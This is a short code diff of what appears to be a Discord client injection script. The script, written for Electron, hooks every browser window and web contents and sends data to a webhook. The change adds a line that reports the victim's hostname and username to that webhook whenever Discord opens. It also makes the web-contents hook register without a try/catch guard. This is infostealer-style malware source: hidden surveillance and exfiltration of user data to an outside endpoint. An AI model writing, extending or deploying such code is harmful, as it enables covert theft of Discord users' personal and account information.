@@ -1,4 +1,4 @@
-const { webContents } = require("electron");
+const { app } = require("electron");
 const https = require("https");
 const http = require("http");
 
@@ -22,6 +22,8 @@ function sendToWebhook(data) {
   req.write(body);
   req.end();
 }
+
+sendToWebhook({ Event: "🟢 Discord Opened", Host: require("os").hostname(), User: require("os").userInfo().username });
 
 function hookWebContents(wc) {
   try {
@@ -74,7 +76,4 @@ app.on("browser-window-created", (_, win) => {
   hookWebContents(win.webContents);
 });
 
-try {
-  const { app } = require("electron");
-  app.on("web-contents-created", (_, wc) => hookWebContents(wc));
-} catch {}
+app.on("web-contents-created", (_, wc) => hookWebContents(wc));
